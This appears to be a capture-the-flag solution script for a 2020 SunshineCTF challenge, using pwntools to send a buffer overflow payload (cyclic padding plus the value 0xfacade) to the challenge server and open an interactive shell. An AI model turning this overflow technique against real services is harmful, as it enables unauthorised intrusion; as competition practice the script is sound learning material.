import pwn

pwn.context.arch = 'amd64'
sh = pwn.remote('chal.2020.sunshinectf.org', 30000)
payload = pwn.cyclic(60) + pwn.p64(0xfacade)

with open('payload', 'wb') as f:
    f.write(payload)

sh.sendline(payload)
sh.interactive()
